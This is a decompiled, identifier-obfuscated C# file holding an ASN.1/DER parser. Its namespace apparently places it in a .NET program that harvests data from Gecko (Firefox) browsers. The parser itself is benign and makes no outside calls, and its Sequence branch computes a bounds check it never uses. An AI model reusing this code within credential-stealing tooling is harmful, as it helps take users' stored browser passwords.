using System;

namespace NoiseMe.Drags.App.Data.Gecko
{
	// Token: 0x02000199 RID: 409
	public static class Апн
	{
		// Token: 0x06000CE2 RID: 3298 RVA: 0x0002936C File Offset: 0x0002756C
		public static нкрпар Create(byte[] dataToParse)
		{
			нкрпар нкрпар = new нкрпар();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				ггорол ггорол = (ггорол)dataToParse[i];
				switch (ггорол)
				{
				case ггорол.Integer:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.Integer,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				case ггорол.BitString:
				case ггорол.Null:
					break;
				case ггорол.OctetString:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.OctetString,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				case ггорол.ObjectIdentifier:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.ObjectIdentifier,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				default:
					if (ггорол == ггорол.Sequence)
					{
						byte[] array;
						if (нкрпар.ObjectLength == 0)
						{
							нкрпар.ObjectType = ггорол.Sequence;
							нкрпар.ObjectLength = dataToParse.Length - (i + 2);
							array = new byte[нкрпар.ObjectLength];
						}
						else
						{
							нкрпар.Objects.Add(new нкрпар
							{
								ObjectType = ггорол.Sequence,
								ObjectLength = (int)dataToParse[i + 1]
							});
							array = new byte[(int)dataToParse[i + 1]];
						}
						int num = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
						Array.Copy(dataToParse, i + 2, array, 0, array.Length);
						нкрпар.Objects.Add(Апн.Create(array));
						i = i + 1 + (int)dataToParse[i + 1];
					}
					break;
				}
			}
			return нкрпар;
		}
	}
}
